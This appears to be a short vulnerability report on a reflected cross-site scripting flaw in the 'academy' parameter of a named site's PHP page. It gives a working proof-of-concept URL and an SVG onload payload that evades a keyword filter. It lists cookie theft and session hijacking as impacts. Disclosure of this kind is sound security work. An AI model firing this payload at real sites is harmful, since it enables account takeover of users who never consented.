# Reflected Cross-Site Scripting (XSS) via `academy` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `academy` parameter of the application. User-controlled input is reflected back into the response without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text
http://kzlabs.com/13.php?academy=xicorr%22%3E%3CsVg%20onload=alealertrt(1)%3E
```

---

## Vulnerable Parameter

```text
academy
```

---

## Payload Used

```html
xicorr"><sVg onload=alealertrt(1)>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/13.php?academy=xicorr%22%3E%3CsVg%20onload=alealertrt(1)%3E
   ```

2. Observe that the payload is reflected in the HTML response.

3. The injected SVG `onload` event executes JavaScript automatically.

4. A popup dialog appears confirming successful XSS execution.

---

## Proof of Concept

```text
http://kzlabs.com/13.php?academy=xicorr%22%3E%3CsVg%20onload=alealertrt(1)%3E
```
<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/fe899f60-bb7d-4455-bf42-bd1a5570e19e" />

---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
